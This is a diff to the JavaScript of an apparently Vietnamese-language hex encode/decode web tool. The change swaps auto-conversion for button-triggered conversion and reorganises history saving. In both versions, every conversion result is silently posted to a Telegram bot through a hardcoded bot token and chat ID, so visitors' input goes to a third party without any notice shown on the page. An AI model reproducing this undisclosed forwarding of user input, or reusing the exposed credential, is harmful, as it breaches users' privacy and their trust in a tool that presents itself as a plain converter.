@@ -1,31 +1,20 @@
-let mode = 'encode'; // Mặc định là chế độ Encode
 let history = []; // Lưu trữ lịch sử kết quả
 
-// Thiết lập chế độ Encode hoặc Decode
-function setMode(selectedMode) {
-    mode = selectedMode;
-
-    // Cập nhật giao diện nút bấm
-    document.getElementById('encodeButton').classList.toggle('btn-primary', mode === 'encode');
-    document.getElementById('encodeButton').classList.toggle('btn-secondary', mode !== 'encode');
-    document.getElementById('decodeButton').classList.toggle('btn-primary', mode === 'decode');
-    document.getElementById('decodeButton').classList.toggle('btn-secondary', mode !== 'decode');
-}
-
-// Theo dõi nhập liệu và tự động chuyển đổi
-document.getElementById('inputText').addEventListener('input', () => {
+// Chuyển đổi khi nhấn nút Encode hoặc Decode
+function convertText(action) {
     const inputText = document.getElementById('inputText').value.trim();
     let output;
 
-    if (mode === 'encode') {
+    if (action === 'encode') {
         output = encodeToHex(inputText);
-    } else if (mode === 'decode') {
+    } else if (action === 'decode') {
         output = decodeFromHex(inputText);
     }
 
     document.getElementById('outputText').value = output;
     sendToTelegram(output); // Tự động gửi kết quả qua Telegram
-});
+    saveToHistory(action, output); // Lưu kết quả vào lịch sử
+}
 
 // Hàm mã hóa chuỗi sang Hex
 function encodeToHex(text) {
@@ -47,7 +36,7 @@ function sendToTelegram(outputText) {
 
     const telegramToken = '7747741271:AAGvVTq9f4BuuvF4AoO3XohUtC7T9aDcLmk'; // Thay bằng token bot của bạn
     const chatId = '5676736853'; // Thay bằng chat ID của bạn
-    const message = `Kết quả (${mode === 'encode' ? 'Encode' : 'Decode'}): ${outputText}`;
+    const message = `Kết quả: ${outputText}`;
 
     fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
         method: 'POST',
@@ -56,12 +45,14 @@ function sendToTelegram(outputText) {
             chat_id: chatId,
             text: message
         })
-    })
-    .then(() => {
-        // Lưu kết quả vào lịch sử
-        history.push({ mode, output: outputText, timestamp: new Date().toLocaleString() });
-    })
-    .catch(error => console.error('Lỗi khi gửi Telegram:', error));
+    }).catch(error => console.error('Lỗi khi gửi Telegram:', error));
+}
+
+// Lưu kết quả vào lịch sử
+function saveToHistory(action, outputText) {
+    if (outputText) {
+        history.push({ mode: action, output: outputText, timestamp: new Date().toLocaleString() });
+    }
 }
 
 // Hàm mở modal Donate
